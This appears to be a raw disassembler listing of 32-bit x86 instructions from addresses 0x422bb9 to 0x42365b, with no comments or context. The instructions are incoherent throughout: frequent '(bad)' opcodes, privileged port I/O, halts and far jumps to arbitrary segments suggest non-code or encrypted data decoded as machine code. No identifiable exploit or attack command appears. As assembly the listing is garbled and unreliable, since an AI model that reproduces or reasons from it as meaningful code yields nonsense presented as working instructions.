  422bb9:	cmp    esi,DWORD PTR [edi]
  422bbb:	mov    bl,0x3a
  422bbd:	pop    ds
  422bbe:	icebp  
  422bbf:	ret    
  422bc0:	icebp  
  422bc1:	pop    edx
  422bc2:	stos   DWORD PTR es:[edi],eax
  422bc3:	add    al,dh
  422bc5:	jle    0x422b67
  422bc7:	dec    edi
  422bc8:	pushf  
  422bc9:	dec    edx
  422bca:	out    0x6,eax
  422bcc:	cmp    BYTE PTR [ebp+0x56],al
  422bcf:	loope  0x422b96
  422bd1:	cmp    dl,BYTE PTR [edx]
  422bd3:	retf   0xf14a
  422bd6:	mov    bh,0xe2
  422bd8:	and    DWORD PTR [edi+0x53b2656d],edi
  422bde:	aaa    
  422bdf:	xchg   edi,eax
  422be0:	sbb    cl,BYTE PTR [eax-0x1095c2cc]
  422be6:	push   esp
  422be7:	nop    DWORD PTR [ebx+ebx*8]
  422beb:	nop
  422bec:	mov    eax,DWORD PTR [eax]
	...
  422c56:	inc    esp
  422c57:	aaa    
  422c58:	dec    edx
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx+0x558d4d9c]
  422c64:	mov    ecx,0x174c907
  422c69:	add    bh,bh
  422c6b:	add    BYTE PTR [eax],al
  422c6d:	add    bh,dl
  422c6f:	mov    esp,0xcd56b861
  422c74:	stc    
  422c75:	(bad)  
  422c76:	pop    esi
  422c77:	pop    edi
  422c78:	push   ebx
  422c79:	test   al,0x90
  422c7b:	mov    cl,0x14
  422c7d:	fsubr  st(4),st
  422c7f:	sbb    bh,BYTE PTR [ebx]
  422c81:	push   0xd0ffb095
  422c86:	mov    ah,BYTE PTR [eax+0x19389f6d]
  422c8c:	ja     0x422c42
  422c8e:	fwait
  422c8f:	push   es
  422c90:	cmp    al,0x54
  422c92:	movq   QWORD PTR [esi],mm7
  422c95:	das    
  422c96:	mov    esp,0x5aff2781
  422c9b:	and    al,0x1a
  422c9d:	pop    ds
  422c9e:	jne    0x422cb5
  422ca0:	pop    esi
  422ca1:	mov    dl,0xbd
  422ca3:	mov    edx,0xbf061eb0
  422ca8:	test   ah,0x6a
  422cab:	stc    
  422cac:	int3   
  422cad:	cwde   
  422cae:	out    dx,eax
  422caf:	mov    ds:0x2cf1223a,al
  422cb4:	and    eax,0x1d7d207a
  422cb9:	out    dx,al
  422cba:	(bad)  
  422cbb:	mov    edi,0x2dc5c0f6
  422cc0:	inc    ebp
  422cc1:	adc    BYTE PTR [eax+ebx*2+0x22fc4d97],0x93
  422cc9:	push   esi
  422cca:	stos   BYTE PTR es:[edi],al
  422ccb:	inc    esi
  422ccc:	(bad)  
  422ccd:	mov    bl,0x31
  422ccf:	mov    ah,0xb9
  422cd1:	adc    ebp,esp
  422cd3:	mov    esp,0xac79dcc8
  422cd8:	arpl   di,di
  422cda:	cmp    ebx,ebp
  422cdc:	jle    0x422cc4
  422cde:	hlt    
  422cdf:	inc    edi
  422ce0:	xchg   esi,eax
  422ce1:	rcr    edx,1
  422ce3:	rol    bh,cl
  422ce5:	jl     0x422d0b
  422ce7:	fild   DWORD PTR [eax-0x4184bab9]
  422ced:	retf   
  422cee:	dec    edx
  422cef:	or     DWORD PTR [ebx-0x48],0x20001e00
  422cf6:	or     al,BYTE PTR [ebp+0x3e]
  422cf9:	mov    WORD PTR [ebp-0x1b2fe02e],fs
  422cff:	ds fs push 0xffffffff
  422d03:	jne    0x422cfd
  422d05:	or     eax,0x5beb679
  422d0a:	mov    esp,0x70bd4399
  422d0f:	scas   al,BYTE PTR es:[edi]
  422d10:	push   ss
  422d11:	nop
  422d12:	cmp    al,0xd5
  422d14:	jmp    0x422cee
  422d16:	jnp    0x422cc8
  422d18:	or     esp,DWORD PTR [eax]
  422d1a:	cdq    
  422d1b:	cli    
  422d1c:	popa   
  422d1d:	push   ds
  422d1e:	repnz dec ebx
  422d20:	out    dx,eax
  422d21:	test   eax,0x14abf33f
  422d26:	nop
  422d27:	push   es
  422d28:	xor    cl,cl
  422d2a:	mov    edx,0x2b82b4d7
  422d2f:	into   
  422d30:	adc    BYTE PTR [ecx-0x5a],cl
  422d33:	in     al,dx
  422d34:	pusha  
  422d35:	fild   DWORD PTR [ebx+0x2d]
  422d38:	mov    ch,0xef
  422d3a:	ret    
  422d3b:	pushf  
  422d3c:	je     0x422d7c
  422d3e:	test   BYTE PTR [eax-0x6e78997f],bl
  422d44:	imul   ebx,DWORD PTR [eax+eax*1+0x2a6f7c1b],0xffffffc8
  422d4c:	fcomp  QWORD PTR [edx]
  422d4e:	mov    cl,0x1
  422d50:	sbb    DWORD PTR [esp+edx*4-0x68],edi
  422d54:	jns    0x422dc1
  422d56:	pusha  
  422d57:	stc    
  422d58:	or     cl,BYTE PTR [ecx+edx*4-0x6f]
  422d5c:	adc    bh,BYTE PTR [ebx]
  422d5e:	mov    ah,0x79
  422d60:	and    al,0x1e
  422d62:	and    dl,cl
  422d64:	mov    edi,0x11173f9f
  422d69:	xor    ecx,DWORD PTR [eax-0x31]
  422d6c:	rol    DWORD PTR [eax],0x0
	...
  422dd3:	add    BYTE PTR [eax],al
  422dd5:	add    BYTE PTR [edi+0x626d60bd],bh
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    ecx,edx
  422de3:	fnsave [ebp+ecx*2+0x175c8]
  422dea:	inc    DWORD PTR [eax]
  422dec:	add    BYTE PTR [eax],al
  422dee:	arpl   sp,ax
  422df0:	popf   
  422df1:	mov    ds:0xd6873750,eax
  422df6:	das    
  422df7:	mov    bh,0x0
  422df9:	or     eax,0xb7ac605c
  422dfe:	pop    ecx
  422dff:	pop    ebp
  422e00:	loopne 0x422de0
  422e02:	mov    ds:0x849994a2,eax
  422e07:	aad    0x2e
  422e09:	hlt    
  422e0a:	jge    0x422e15
  422e0c:	hlt    
  422e0d:	popf   
  422e0e:	mov    dl,0x5c
  422e10:	sti    
  422e11:	(bad)  
  422e12:	fcomp  DWORD PTR [esi+eax*2]
  422e15:	xchg   bh,dl
  422e17:	xchg   esi,eax
  422e18:	xor    al,0x46
  422e1a:	aas    
  422e1b:	(bad)  
  422e1c:	fwait
  422e1d:	scas   al,BYTE PTR es:[edi]
  422e1e:	pop    es
  422e1f:	xchg   ecx,eax
  422e20:	mov    bl,0xec
  422e22:	cmp    al,0xe0
  422e24:	ins    BYTE PTR es:[edi],dx
  422e25:	enter  0x3eb6,0x3b
  422e29:	lock jp 0x422e3f
  422e2c:	out    dx,eax
  422e2d:	cmp    dh,0x48
  422e30:	xchg   ebp,eax
  422e31:	or     al,0xa1
  422e33:	mov    al,ds:0x2edfb9f0
  422e38:	mov    esi,?
  422e3a:	push   esi
  422e3b:	fwait
  422e3c:	(bad)
  422e40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e41:	std    
  422e42:	xor    bl,dl
  422e44:	arpl   WORD PTR [ebx+0x15da3391],ax
  422e4a:	add    ah,BYTE PTR [edx]
  422e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e4d:	push   ebx
  422e4e:	mov    al,0x87
  422e50:	(bad)  
  422e51:	(bad)  
  422e53:	dec    esp
  422e54:	arpl   WORD PTR [ecx+esi*2-0x41f3b4f4],ax
  422e5b:	fs (bad) 
  422e5d:	retf   
  422e5e:	xor    DWORD PTR [eax-0x773d4eda],esi
  422e64:	clc    
  422e65:	fnstsw ax
  422e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e68:	out    0x9c,eax
  422e6a:	and    esi,DWORD PTR [eax-0x80]
  422e6d:	inc    edx
  422e6e:	ins    DWORD PTR es:[edi],dx
  422e6f:	mov    al,0x28
  422e71:	pop    edi
  422e72:	jp     0x422e6e
  422e74:	std    
  422e75:	jno    0x422e8c
  422e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e78:	(bad)  
  422e79:	and    esi,DWORD PTR [edx]
  422e7b:	(bad)  
  422e7c:	pop    esi
  422e7d:	push   eax
  422e7e:	adc    al,0xd9
  422e80:	inc    edi
  422e81:	mov    WORD PTR [esi],cs
  422e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e84:	push   ebp
  422e85:	loope  0x422ee7
  422e87:	(bad)  
  422e88:	scas   eax,DWORD PTR es:[edi]
  422e89:	js     0x422e0b
  422e8b:	pushf  
  422e8c:	adc    bh,BYTE PTR [ebp+0x3d]
  422e8f:	ffreep st(3)
  422e91:	test   BYTE PTR [ecx],ah
  422e93:	cvtdq2ps xmm5,xmm1
  422e96:	pop    ebx
  422e97:	mov    esi,0xb2e9252e
  422e9c:	and    edi,DWORD PTR [eax+ecx*8]
  422e9f:	jne    0x422e28
  422ea1:	ss jg  0x422f22
  422ea4:	mov    eax,0x3fc86b03
  422ea9:	mov    ebp,0xb8b8b169
  422eae:	jg     0x422e39
  422eb0:	leave  
  422eb1:	out    0xfd,eax
  422eb3:	pop    ecx
  422eb4:	call   DWORD PTR [edi-0x6e]
  422eb7:	push   cs
  422eb8:	push   edi
  422eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eba:	mov    DWORD PTR [edx+0x71797a36],edx
  422ec0:	nop
  422ec1:	(bad)  
  422ec3:	pushf  
  422ec4:	ret    
  422ec5:	hlt    
  422ec6:	dec    ecx
  422ec7:	push   0x6a
  422ec9:	pop    edi
  422eca:	and    DWORD PTR [esi],ebp
  422ecc:	adc    cl,BYTE PTR [edx-0x42]
  422ecf:	sub    BYTE PTR [eax-0x4e3bed3],dl
  422ed5:	and    eax,0x2f11b594
  422eda:	call   0x5ab595e3
  422edf:	add    bl,BYTE PTR [edx+0x1a]
  422ee2:	enter  0xeede,0xd0
  422ee6:	sbb    esp,DWORD PTR [ecx+0x8]
  422ee9:	lds    ecx,FWORD PTR [edi+0x39]
  422eec:	hlt    
	...
  422f55:	add    BYTE PTR [ebx-0x21e677ab],al
  422f5b:	fst    QWORD PTR [ebx+0x33b808df]
  422f61:	retf   0xfd87
  422f64:	cmp    BYTE PTR [ecx+0x176c7],ch
  422f6a:	inc    DWORD PTR [eax]
  422f6c:	add    BYTE PTR [eax],al
  422f6e:	sub    DWORD PTR [edi+ecx*4+0xa],esp
  422f72:	das    
  422f73:	in     eax,dx
  422f74:	mov    ds:0x6bdc9c2e,eax
  422f79:	bound  esi,QWORD PTR [edx+0x4a3c6aa6]
  422f7f:	sbb    ebx,ebp
  422f81:	adc    DWORD PTR [esi+0x29],esp
  422f84:	arpl   WORD PTR [ebx-0x442797b5],di
  422f8a:	dec    eax
  422f8b:	(bad)  
  422f8c:	mov    eax,ds:0x5d9d3c64
  422f91:	mov    ds:0x63907812,al
  422f96:	ins    DWORD PTR es:[edi],dx
  422f97:	aad    0x7a
  422f99:	xchg   edi,eax
  422f9a:	xchg   ecx,eax
  422f9b:	pop    esi
  422f9c:	jg     0x422fed
  422f9e:	cld    
  422f9f:	outs   dx,DWORD PTR ds:[esi]
  422fa0:	js     0x423004
  422fa2:	retf   
  422fa3:	ficom  DWORD PTR [ebx-0x4fc8c634]
  422fa9:	retf   
  422faa:	or     ecx,DWORD PTR [eax+0x1fb4c90f]
  422fb0:	sti    
  422fb1:	das    
  422fb2:	xchg   ebp,eax
  422fb3:	and    eax,0x7ddc0ab0
  422fb8:	cmp    BYTE PTR [esi-0x1a],dh
  422fbb:	cmp    ah,bl
  422fbd:	inc    edx
  422fbe:	or     al,0x3
  422fc0:	mov    ss,WORD PTR [eax+0x4b]
  422fc3:	adc    ch,al
  422fc5:	test   al,0x72
  422fc7:	jmp    0x63633b69
  422fcc:	jg     0x422fd6
  422fce:	test   DWORD PTR [ebx],0xfc6401cd
  422fd4:	jno    0x423002
  422fd6:	adc    dl,BYTE PTR [ebp+eax*4-0x7dbaa977]
  422fdd:	cwde   
  422fde:	jecxz  0x423015
  422fe0:	(bad)  
  422fe1:	ins    BYTE PTR es:[edi],dx
  422fe2:	mov    eax,ds:0x225f6368
  422fe7:	lods   al,BYTE PTR ds:[esi]
  422fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fe9:	mov    al,ds:0x9646adfc
  422fee:	dec    esi
  422fef:	add    BYTE PTR [esi],0x50
  422ff2:	mov    ah,0xca
  422ff4:	leave  
  422ff5:	dec    edi
  422ff6:	(bad)  
  422ff7:	push   ds
  422ff8:	not    BYTE PTR [eax+ebx*2]
  422ffb:	imul   edx,esi,0xffffffd0
  422ffe:	xchg   edi,eax
  422fff:	xchg   BYTE PTR [ebx+0x20475080],ch
  423005:	mov    WORD PTR [edi],ds
  423007:	push   edi
  423008:	fadd   QWORD PTR [ebp-0x5f]
  42300b:	mov    WORD PTR ds:0xe4099bab,?
  423011:	fidivr DWORD PTR [ecx]
  423013:	or     esi,DWORD PTR [eax+0x180fc8ac]
  423019:	pop    eax
  42301a:	shl    DWORD PTR [ecx-0x64],0xc
  42301e:	and    eax,DWORD PTR gs:[ecx+0x4c]
  423022:	popa   
  423023:	cmp    eax,0x8ec450ac
  423028:	sub    DWORD PTR [ebp-0x72],edx
  42302b:	cmp    DWORD PTR [edx+0x69b1c864],ecx
  423031:	test   BYTE PTR [esi],cl
  423033:	pop    eax
  423034:	into   
  423035:	out    0x4f,eax
  423037:	sub    DWORD PTR [edx+ebx*2+0x50],esi
  42303b:	push   cs
  42303c:	fst    QWORD PTR [ecx+0x798a40]
  423042:	sub    eax,0xd59db8b6
  423047:	mov    esi,0xe087ac5b
  42304c:	repnz test bh,al
  42304f:	aaa    
  423050:	pop    ecx
  423051:	xor    bl,bl
  423053:	or     edi,DWORD PTR [ecx+0x29]
  423056:	mov    eax,0x80acb9a8
  42305b:	repz aaa 
  42305d:	(bad)  
  42305e:	dec    ebp
  42305f:	cmp    eax,DWORD PTR [ecx]
  423061:	pop    ebp
  423062:	push   edx
  423063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423064:	out    dx,eax
  423065:	lods   al,BYTE PTR ds:[esi]
  423066:	cmp    eax,0x7dc86fbc
  42306b:	fwait
  42306c:	inc    eax
	...
  4230d5:	add    BYTE PTR [esi-0x1c],al
  4230d8:	bound  ecx,QWORD PTR [eax-0x1111711e]
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [edx+ebp*8-0x39bbfad0],esp
  4230e7:	ja     0x4230ea
  4230e9:	add    bh,bh
  4230eb:	add    BYTE PTR [eax],al
  4230ed:	add    BYTE PTR [esi-0xb],bh
  4230f0:	mov    cl,0x24
  4230f2:	lahf   
  4230f3:	addr16 je 0x42309f
  4230f6:	popa   
  4230f7:	mov    al,ds:0xd4b5723d
  4230fc:	xor    eax,0x20ec6456
  423101:	xchg   BYTE PTR [ebx+0x4a],ch
  423104:	push   cs
  423105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423106:	mov    cl,0x4
  423108:	in     eax,dx
  423109:	sar    BYTE PTR [ecx+eiz*2-0x50a490a0],1
  423110:	push   ebp
  423111:	test   eax,0x1c8a935e
  423116:	fwait
  423117:	sbb    eax,0x8dc53754
  42311c:	jo     0x4230cd
  42311e:	js     0x42319a
  423120:	dec    esp
  423121:	lea    edi,[ecx-0x2e]
  423124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423125:	rcl    DWORD PTR [ecx-0x17],0x0
  423129:	mov    ebp,0xd90bf019
  42312e:	idiv   esp
  423130:	lock aam 0xc8
  423133:	pop    edi
  423134:	lea    eax,[esi-0x310409a4]
  42313a:	push   esi
  42313b:	jmp    0x44af1a56
  423140:	pop    ebx
  423141:	sti    
  423142:	aas    
  423143:	adc    al,0xa7
  423145:	push   ss
  423146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423147:	idiv   ebp
  423149:	sbb    BYTE PTR [esp+ebx*1-0x76832915],0x90
  423151:	mov    dh,0xe1
  423153:	(bad)  [eax+edi*8-0x7f]
  423157:	hlt    
  423158:	in     eax,0xae
  42315a:	scas   eax,DWORD PTR es:[edi]
  42315b:	xchg   edi,eax
  42315c:	imul   ebx,DWORD PTR [eax],0x1c
  42315f:	mov    esi,0x96b6d9a
  423164:	and    al,0x81
  423166:	mov    DWORD PTR [eax-0x15499193],ebp
  42316c:	jmp    0x5a95a3ce
  423171:	inc    ebx
  423172:	test   eax,0x19f88284
  423177:	xor    DWORD PTR [ecx+0x1615b906],edx
  42317d:	and    cl,al
  42317f:	or     eax,0x53982b2
  423184:	mov    dl,0x7f
  423186:	mov    ch,0x96
  423188:	cmc    
  423189:	ror    BYTE PTR [ecx],0x7a
  42318c:	sbb    ah,BYTE PTR [edi-0x24]
  42318f:	out    dx,al
  423190:	sub    BYTE PTR [ebp+0x3d],al
  423193:	mov    eax,0x59324e0e
  423198:	mov    ch,0x2b
  42319a:	data16 mov bl,BYTE PTR [edi+0xc]
  42319e:	jmp    0x42313a
  4231a0:	loop   0x42315f
  4231a2:	sub    bh,ch
  4231a4:	shl    BYTE PTR [edx+edx*4],1
  4231a7:	sub    dl,BYTE PTR [eax-0x14]
  4231aa:	enter  0xf32e,0xc7
  4231ae:	into   
  4231af:	xlat   BYTE PTR ds:[ebx]
  4231b0:	sub    edi,DWORD PTR [ecx+0x7bbe2dd5]
  4231b6:	mov    edx,0xc73ec478
  4231bb:	rcr    DWORD PTR [esp+eax*1],1
  4231be:	hlt    
  4231bf:	push   ss
  4231c0:	(bad)  [ebx]
  4231c2:	jns    0x4231e7
  4231c4:	mov    eax,ds:0x9a15b89d
  4231c9:	and    edx,DWORD PTR [esi]
  4231cb:	int3   
  4231cc:	repz or edx,edx
  4231cf:	push   es
  4231d0:	scas   al,BYTE PTR es:[edi]
  4231d1:	mov    ch,0x91
  4231d3:	xor    BYTE PTR [esi+0x6],cl
  4231d6:	jne    0x42319b
  4231d8:	imul   esi,DWORD PTR [eax+eax*1],0x4c
  4231dc:	sub    eax,0xc9a59349
  4231e1:	(bad)  
  4231e2:	mov    ds:0x6bcb9579,al
  4231e7:	out    dx,eax
  4231e8:	mov    edi,0x5182e1ac
	...
  423255:	add    BYTE PTR [ecx-0xf],bh
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx+0x4b6b6d0],esp
  423266:	lds    edi,FWORD PTR [eax+0x1]
  423269:	add    bh,bh
  42326b:	add    BYTE PTR [eax],al
  42326d:	add    BYTE PTR [ebp-0x1e],al
  423270:	jle    0x42322b
  423272:	sub    cl,ch
  423274:	pop    ecx
  423275:	fsubrp st(3),st
  423277:	dec    ebp
  423278:	aas    
  423279:	lock add eax,0x3c28935a
  42327f:	jmp    0xc0fc1aa7
  423284:	xor    DWORD PTR ds:0xbca50f1d,esi
  42328a:	shl    DWORD PTR [eax-0x5370a165],cl
  423290:	add    esi,DWORD PTR [edx]
  423292:	sbb    ch,dl
  423294:	fnsave [eax]
  423296:	sbb    al,0x99
  423298:	xchg   esi,eax
  423299:	add    ebx,DWORD PTR [ebx-0x5d8391d3]
  42329f:	mov    esi,0x693cb7c2
  4232a4:	mov    eax,ds:0xf34fd90e
  4232aa:	or     dl,bh
  4232ac:	inc    BYTE PTR [eax+0x10bc8d6d]
  4232b2:	loope  0x4232fe
  4232b4:	das    
  4232b5:	inc    ebx
  4232b6:	imul   ebp,DWORD PTR [edx+0x6a7e030a],0xffffff88
  4232bd:	and    eax,0x697aa47a
  4232c2:	mov    BYTE PTR [ebx+0xa],0xe4
  4232c6:	mov    eax,0x7e30a16a
  4232cb:	ja     0x423344
  4232cd:	out    0x7c,al
  4232cf:	jmp    0x529ff358
  4232d4:	div    BYTE PTR [ecx-0x20]
  4232d7:	sub    al,0xb8
  4232d9:	jmp    0x2868:0x31d5291e
  4232e0:	push   0xff78c081
  4232e5:	scas   eax,DWORD PTR es:[edi]
  4232e6:	xchg   esp,eax
  4232e7:	imul   ecx,ecx,0xf10c6ed
  4232ed:	fmul   DWORD PTR [esi]
  4232ef:	ds int 0x2d
  4232f2:	cli    
  4232f3:	shl    edx,cl
  4232f5:	xchg   ebp,eax
  4232f6:	pop    edi
  4232f7:	xor    esp,eax
  4232f9:	(bad)  
  4232fa:	pop    edx
  4232fb:	dec    edx
  4232fc:	lock and al,0xf2
  4232ff:	or     ecx,DWORD PTR [edx+0x32c1f1e7]
  423305:	test   BYTE PTR [ebx-0x195dcffc],0xd2
  42330c:	jp     0x423314
  42330e:	mov    bl,0x42
  423310:	bound  eax,QWORD PTR cs:[ebp-0x4c]
  423314:	fisttp DWORD PTR [esi+0x1e]
  423317:	fwait
  423318:	cmp    DWORD PTR [edi+edx*8+0x71],ecx
  42331c:	sbb    DWORD PTR [ecx],edi
  42331e:	and    al,0xe0
  423320:	push   eax
  423321:	call   0xe2e78b7f
  423326:	or     al,0x2a
  423328:	jb     0x423329
  42332a:	ret    0xcd1a
  42332d:	mov    bh,0xfc
  42332f:	sbb    ch,BYTE PTR [ebx]
  423331:	dec    ebp
  423332:	shr    bl,1
  423334:	xchg   ebx,eax
  423335:	mov    al,0x62
  423337:	xchg   edi,eax
  423338:	fnstenv [esi+edi*1]
  42333b:	cld    
  42333c:	push   esp
  42333d:	(bad)  
  42333e:	push   eax
  42333f:	jmp    0x8158:0x3e121c5f
  423346:	(bad)  
  423347:	cs push 0xffffffc7
  42334a:	push   0xffffffeb
  42334c:	push   ebp
  42334d:	add    ebx,DWORD PTR [ecx]
  42334f:	mov    eax,ds:0x57839bda
  423354:	add    BYTE PTR [eax],0x2a
  423357:	je     0x423331
  423359:	dec    ecx
  42335a:	pushf  
  42335b:	and    ebp,DWORD PTR [eax+0x5d]
  42335e:	test   DWORD PTR [ebx+edx*2-0x66],0x605fabe2
  423366:	xor    al,0x7d
  423368:	pusha  
  423369:	mov    bl,0x78
  42336b:	mov    ds:0x3f,eax
	...
  4233d4:	add    BYTE PTR [eax],al
  4233d6:	clc    
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0x9cb20f44
  4233e4:	lds    ecx,FWORD PTR [ecx]
  4233e6:	les    edi,FWORD PTR [ecx+0x1]
  4233e9:	add    bh,bh
  4233eb:	add    BYTE PTR [eax],al
  4233ed:	add    BYTE PTR [eax-0x3f8027b2],bl
  4233f3:	int    0xb1
  4233f5:	jp     0x4233af
  4233f7:	mov    ebx,gs
  4233f9:	inc    esi
  4233fa:	inc    edi
  4233fb:	xchg   edx,eax
  4233fc:	lock aam 0x28
  4233ff:	in     al,0x71
  423401:	enter  0x384,0x51
  423405:	retf   0xc3b3
  423408:	sub    al,0xce
  42340a:	cld    
  42340b:	push   esp
  42340c:	adc    DWORD PTR [eax],0x16
  42340f:	pop    ds
  423410:	xchg   ebx,eax
  423411:	dec    esp
  423412:	stc    
  423413:	loop   0x423442
  423415:	jle    0x423480
  423417:	and    BYTE PTR [edx-0x66598877],0xe4
  42341e:	(bad)  
  42341f:	in     eax,dx
  423420:	and    edi,DWORD PTR [edi+0x3a]
  423423:	cli    
  423424:	xor    bh,BYTE PTR [edx]
  423426:	jo     0x4233b5
  423428:	jmp    0x4233ca
  42342a:	pop    edi
  42342b:	jge    0x4233b2
  42342d:	adc    eax,0xa9f2276d
  423432:	jne    0x42347d
  423434:	push   ss
  423435:	mov    ah,0x8b
  423437:	push   esp
  423438:	jne    0x4233ed
  42343a:	clc    
  42343b:	repz mov edi,0xbc659ab
  423441:	jecxz  0x4234b4
  423443:	test   eax,0xfe41d162
  423448:	push   es
  423449:	call   0x52e8:0x2ee99fe0
  423450:	dec    edi
  423451:	daa    
  423452:	(bad)  
  423453:	xor    ebp,DWORD PTR [edi]
  423455:	ret    
  423456:	pop    ecx
  423457:	adc    al,0x95
  423459:	and    BYTE PTR [ebp+0x45],cl
  42345c:	pop    edx
  42345d:	xchg   ebp,eax
  42345e:	sub    al,0xa5
  423460:	das    
  423461:	jno    0x4233ff
  423463:	push   es
  423464:	mov    ah,0x31
  423466:	or     DWORD PTR [esi+0x6b],edx
  423469:	add    edx,edi
  42346b:	out    dx,al
  42346c:	mov    bh,0x9a
  42346e:	test   eax,0x953ddd03
  423473:	xor    ebx,DWORD PTR [ebx]
  423475:	ret    0xc05e
  423478:	lods   al,BYTE PTR ds:[esi]
  423479:	push   cs
  42347a:	push   ds
  42347b:	sbb    edi,edx
  42347d:	pop    eax
  42347e:	or     DWORD PTR [ebx+0x20],0x2644c484
  423485:	ret    0xc0be
  423488:	outs   dx,BYTE PTR ds:[esi]
  423489:	push   ebx
  42348a:	and    al,0xe8
  42348c:	dec    esi
  42348d:	adc    DWORD PTR [edx+0x1f],0x60b41466
  423494:	fstp   QWORD PTR [ebx-0x37]
  423497:	xlat   BYTE PTR ds:[ebx]
  423498:	adc    ah,0xd7
  42349b:	xor    al,0x2b
  42349d:	cs ss jmp 0x3d045d36
  4234a4:	mov    ah,0xb3
  4234a6:	scas   eax,DWORD PTR es:[edi]
  4234a7:	or     BYTE PTR ds:0x7e5b31b6,0x2b
  4234ae:	pop    ecx
  4234af:	fwait
  4234b0:	test   BYTE PTR [esi],dl
  4234b2:	icebp  
  4234b3:	repz cld 
  4234b5:	push   ebx
  4234b6:	test   dl,al
  4234b8:	or     dh,BYTE PTR [esi+0x11]
  4234bb:	and    bl,ah
  4234bd:	and    eax,0x7e2274ea
  4234c2:	daa    
  4234c3:	pop    es
  4234c4:	mov    bl,0x87
  4234c6:	bound  ecx,QWORD PTR ds:[eax]
  4234c9:	test   BYTE PTR [esi-0x6b2bba90],bl
  4234cf:	push   esi
  4234d0:	adc    dh,ch
  4234d2:	jge    0x423490
  4234d4:	retf   
  4234d5:	push   ebp
  4234d6:	dec    edx
  4234d7:	mov    bh,0xa
  4234d9:	test   BYTE PTR [edi+0x16585247],cl
  4234df:	push   ecx
  4234e0:	jae    0x4234f1
  4234e2:	and    BYTE PTR [eax+esi*4+0xc],0x68
  4234e7:	clc    
  4234e8:	jns    0x4234b7
  4234ea:	sub    dh,cl
  4234ec:	mov    al,0x0
	...
  423556:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42355d:	mov    edi,0x1fadf467
  423562:	into   
  423563:	shl    DWORD PTR ds:[edx+0x17ac3],1
  42356a:	inc    DWORD PTR [eax]
  42356c:	add    BYTE PTR [eax],al
  42356e:	(bad)  
  42356f:	out    0x9,al
  423571:	push   es
  423572:	(bad)  [ebp-0x13]
  423575:	cwde   
  423576:	pop    ss
  423577:	mov    ecx,0x9e14f107
  42357c:	div    BYTE PTR [esp+esi*4-0x69]
  423580:	leave  
  423581:	adc    eax,0xa5a5bd04
  423586:	inc    edx
  423587:	sub    ch,BYTE PTR [ebx-0x29]
  42358a:	jmp    0x1ee1:0xec15cc2f
  423591:	push   edx
  423592:	and    eax,DWORD PTR [ecx-0xd]
  423595:	cmp    dh,ch
  423597:	jge    0x423577
  423599:	xor    al,BYTE PTR [eax]
  42359b:	dec    eax
  42359c:	loope  0x4235c8
  42359e:	jns    0x423611
  4235a0:	and    ah,cl
  4235a2:	jle    0x4235dc
  4235a4:	inc    eax
  4235a5:	pop    ebx
  4235a6:	jns    0x42360a
  4235a8:	sahf   
  4235a9:	sub    ah,ah
  4235ab:	test   eax,0x76264885
  4235b0:	push   eax
  4235b1:	mov    al,ds:0xe2a024b8
  4235b6:	les    ebp,FWORD PTR [edx-0x68]
  4235b9:	push   ss
  4235ba:	dec    esp
  4235bb:	fiadd  DWORD PTR [ecx-0x68]
  4235be:	xor    dl,ch
  4235c0:	imul   edx,DWORD PTR [eax+eiz*4-0x3e68d1db],0xffffff97
  4235c8:	or     dh,dh
  4235ca:	stc    
  4235cb:	or     dh,BYTE PTR [ebx-0x6df96a4b]
  4235d1:	mov    cl,0xbb
  4235d3:	mov    ebx,0x87e481d6
  4235d8:	lahf   
  4235d9:	sahf   
  4235da:	ss xchg edi,eax
  4235dc:	call   0xfb569182
  4235e1:	sbb    DWORD PTR [ebx+esi*8],0xffffff8d
  4235e5:	xor    ah,BYTE PTR [ecx+0x24]
  4235e8:	adc    BYTE PTR [edi-0x546d0562],dh
  4235ee:	fdiv   QWORD PTR [edx-0x647d4e04]
  4235f4:	lds    edi,FWORD PTR [ebx+0x1f9a179b]
  4235fa:	sbb    eax,0x44b177c2
  4235ff:	shr    BYTE PTR [edi+0x76],1
  423602:	and    al,0x51
  423604:	inc    ebx
  423605:	dec    esp
  423606:	push   cs
  423607:	fdivr  QWORD PTR [ecx-0x62e1ef6c]
  42360d:	xlat   BYTE PTR ds:[ebx]
  42360e:	js     0x423686
  423610:	xchg   edi,eax
  423611:	dec    edx
  423612:	mov    bh,0xc9
  423614:	xchg   DWORD PTR [ebp+esi*1-0x6f],edi
  423618:	lds    esp,FWORD PTR [esp+edx*1+0x532f86bf]
  42361f:	pop    ds
  423620:	cwde   
  423621:	xor    BYTE PTR [eax],ah
  423623:	stos   BYTE PTR es:[edi],al
  423624:	mov    edi,0x15042a1f
  423629:	mov    ?,WORD PTR [esi+edi*2-0x35818c82]
  423630:	fbld   TBYTE PTR [edx-0x26]
  423633:	scas   al,BYTE PTR es:[edi]
  423634:	ins    BYTE PTR es:[edi],dx
  423635:	rcl    BYTE PTR [edx-0x1f],0x34
  423639:	cmp    al,0xcb
  42363b:	cdq    
  42363c:	lock int 0x29
  42363f:	out    0xdf,eax
  423641:	adc    esp,DWORD PTR ds:0xfba995ee
  423647:	lds    ebx,FWORD PTR [ebx]
  423649:	pop    ss
  42364a:	push   edi
  42364b:	popa   
  42364c:	das    
  42364d:	adc    ebp,DWORD PTR [edi-0xc]
  423650:	xchg   edx,eax
  423651:	and    eax,0x406c1a8a
  423656:	adc    eax,0xd2693cee
  42365b:	popf   
